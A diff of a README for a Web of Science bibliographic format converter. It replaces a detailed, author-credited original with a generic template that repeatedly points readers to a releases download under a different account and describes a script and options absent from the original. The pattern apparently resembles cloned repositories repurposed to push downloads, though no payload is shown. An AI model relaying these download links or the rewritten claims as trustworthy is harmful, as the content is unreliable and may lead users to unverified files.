@@ -1,119 +1,110 @@
-# Web of Science Format Converter
+# WOS Format Converter 📝
 
-This repository contains two Python scripts that allow you to convert **Web of Science** bibliographic data between the following formats:
+![WOS Format Converter](https://img.shields.io/badge/Download-Releases-brightgreen)
 
-- `TabDelimited.txt` → `WOS.xlsx` and `PlainText.txt`
-- `Filtered WOS.xlsx` → `Filtered TabDelimited.txt` and `Filtered PlainText.txt`
+Welcome to the WOS Format Converter! This tool allows you to convert Web of Science files between tab-delimited, Excel, and plain-text formats. Whether you're working on bibliometric analysis, systematic literature reviews, or reference management, this converter simplifies your data handling tasks.
 
-These tools are particularly useful when you:
-- Need to extract cited references (which the default WOS Excel export omits).
-- Apply document filtering using tools like PRISMA and need to export the cleaned dataset.
+## Table of Contents
 
----
- 
-## 🔧 Scripts Overview
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Formats](#supported-formats)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-### 1. `WOS_Converter_TabDelimited_to_xlsx_PlainText.py`
-**Purpose**: Converts the WOS `TabDelimited.txt` export file to:
-- A full-featured Excel file (`WOS.xlsx`)
-- A plain-text Web of Science format file (`PlainText.txt`) that includes full tagging (e.g., `AU`, `CR`, etc.)
+## Features
 
-> Use this script **right after downloading** from Web of Science.
+- **Easy Conversion**: Convert files quickly between tab-delimited, Excel, and plain-text formats.
+- **User-Friendly**: Designed with simplicity in mind, making it accessible for everyone.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Data Cleaning**: Streamline your data for analysis.
+- **Supports Multiple Formats**: Handle various file types with ease.
 
----
+## Installation
 
-### 2. `WOS_Converter_Filtered_xlsx_to_TabDelimitedText_PlainText.py`
-**Purpose**: After filtering your Excel file (e.g., manually or via PRISMA), use this script to:
-- Reconstruct the tab-delimited format (`TabDelimited.txt`)
-- Recreate the tagged plain-text format (`PlainText.txt`) for further processing
+To get started, download the latest release from our [Releases section](https://github.com/landouzefps/wos-format-converter/releases). After downloading, follow these steps:
 
-> Use this after filtering your Excel (`WOS_Filtered.xlsx`) to retain only relevant records.
+1. **Unzip the File**: Extract the contents of the downloaded file.
+2. **Install Dependencies**: Make sure you have Python installed. You can install required libraries using:
+   ```bash
+   pip install -r requirements.txt
+   ```
+3. **Run the Script**: Navigate to the folder where the script is located and run:
+   ```bash
+   python wos_converter.py
+   ```
 
----
+## Usage
 
-## 💡 How to Use
+Using the WOS Format Converter is straightforward. Here’s how to use it:
 
-1. Clone this repository:
-    ```bash
-    git clone https://github.com/yourusername/wos-format-converter.git
-    cd wos-format-converter
-    ```
+1. **Open the Command Line**: Access your terminal or command prompt.
+2. **Navigate to the Script Location**: Use the `cd` command to go to the directory where the script is located.
+3. **Execute the Script**: Run the script with the required parameters. For example:
+   ```bash
+   python wos_converter.py --input yourfile.txt --output outputfile.xlsx --format excel
+   ```
 
-2. Install dependencies:
-    ```bash
-    pip install pandas
-    ```
+### Command-Line Options
 
-3. Run the appropriate script based on your workflow:
-    ```bash
-    python WOS_Converter_TabDelimited_to_xlsx_PlainText.py
-    # OR
-    python WOS_Converter_Filtered_xlsx_to_TabDelimitedText_PlainText.py
-    ```
+- `--input`: Specify the input file path.
+- `--output`: Specify the output file path.
+- `--format`: Choose the desired output format (tab, excel, text).
 
----
+## Supported Formats
 
-## 📂 Input/Output Examples
+The WOS Format Converter supports the following formats:
 
-**Initial Conversion:**
-- Input: `TabDelimited.txt`
-- Output: `WOS.xlsx`, `PlainText.txt`
+- **Tab-Delimited**: Ideal for importing into databases or other software.
+- **Excel**: Perfect for analysis and sharing.
+- **Plain Text**: Useful for quick edits and reviews.
 
-**After Filtering:**
-- Input: `WOS_Filtered.xlsx`
-- Output: `TabDelimited_Filtered.txt`, `PlainText_Filtered.txt`
+## Contributing
 
----
+We welcome contributions! If you would like to help improve the WOS Format Converter, please follow these steps:
 
-## 🧪 Compatibility with Bibliometric Tools
+1. **Fork the Repository**: Click on the fork button at the top right of the page.
+2. **Clone Your Fork**: Use the command:
+   ```bash
+   git clone https://github.com/YOUR_USERNAME/wos-format-converter.git
+   ```
+3. **Create a Branch**: Make a new branch for your feature or bug fix:
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+4. **Make Your Changes**: Implement your feature or fix the bug.
+5. **Commit Your Changes**: Use clear commit messages:
+   ```bash
+   git commit -m "Add feature or fix description"
+   ```
+6. **Push to Your Fork**: Push your changes to GitHub:
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+7. **Create a Pull Request**: Go to the original repository and create a pull request.
 
-### ✅ VOSviewer
-The `TabDelimited.txt` file generated by this tool is suitable for **VOSviewer**, a software tool for constructing and visualizing bibliometric networks.
+## License
 
-> **Cite VOSviewer** as:  
-> Van Eck, N. J., & Waltman, L. (2010). *Software survey: VOSviewer, a computer program for bibliometric mapping*. Scientometrics, 84(2), 523–538.  
-> [https://www.vosviewer.com](https://www.vosviewer.com)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
----
+## Contact
 
-### ✅ Bibliometrix (Biblioshiny in R)
-The `PlainText.txt` output is compatible with the **Bibliometrix** R package and its web-based interface **Biblioshiny** for comprehensive science mapping analysis.
+For questions or support, please reach out to the repository maintainer:
 
-> **Cite Bibliometrix** as:  
-> Aria, M., & Cuccurullo, C. (2017). *bibliometrix: An R-tool for comprehensive science mapping analysis*. *Journal of Informetrics, 11*(4), 959–975.  
-> [https://www.bibliometrix.org](https://www.bibliometrix.org)
+- **Name**: Your Name
+- **Email**: your.email@example.com
+- **GitHub**: [Your GitHub Profile](https://github.com/YOUR_USERNAME)
 
----
+## Additional Resources
 
-### ✅ CiteSpace
-The `PlainText.txt` output is also compatible with **CiteSpace**, a Java-based application for visualizing and analyzing trends and patterns in scientific literature.
+- [Web of Science](https://www.webofscience.com)
+- [Bibliometrics](https://en.wikipedia.org/wiki/Bibliometrics)
+- [Systematic Reviews](https://en.wikipedia.org/wiki/Systematic_review)
 
-To ensure compatibility with CiteSpace:
-- Export records in **Plain Text** format with **Full Record and Cited References**
-- Name files as `download_*.txt` (e.g., `download_1.txt`)
-- Use data from supported sources like **Web of Science** or **Scopus**
+## Conclusion
 
-> **Cite CiteSpace** as:  
-> Chen, C. (2006). *CiteSpace II: Detecting and visualizing emerging trends and transient patterns in scientific literature*. *Journal of the American Society for Information Science and Technology, 57*(3), 359–377.  
-> [https://doi.org/10.1002/asi.20317](https://doi.org/10.1002/asi.20317)
+The WOS Format Converter is a valuable tool for researchers and academics who need to manage and convert bibliographic data. By simplifying the conversion process, it helps you focus on your research rather than data handling.
 
----
-
-## 📌 Notes
-
-- The conversion preserves essential Web of Science tags (`AU`, `TI`, `CR`, etc.)
-- Cited references (`CR`) are correctly included in the plain-text output, unlike in the native WOS Excel export
-- Column mapping is based on the official WOS format standard
-
----
-
-## ✍️ Author
-
-Created by **Nasser Khalili**  
-If you use this tool in your research, feel free to give a ⭐ or cite the repository.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+To get started, visit our [Releases section](https://github.com/landouzefps/wos-format-converter/releases) and download the latest version. Happy converting!
